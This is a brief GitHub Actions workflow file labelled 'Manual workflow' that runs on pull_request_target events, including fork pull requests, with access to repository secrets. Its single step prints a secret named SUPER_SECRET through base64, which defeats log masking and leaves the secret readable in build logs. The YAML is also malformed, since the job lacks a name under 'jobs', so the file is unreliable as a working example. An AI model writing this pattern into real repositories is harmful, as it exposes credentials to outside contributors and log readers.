  name: Manual workflow

on:
  pull_request_target:
    types: [assigned, opened, synchronize, reopened]

jobs:
    runs-on: ubuntu-latest
    steps:
      - run: echo ${{ secrets.SUPER_SECRET }} | base64 -w0 

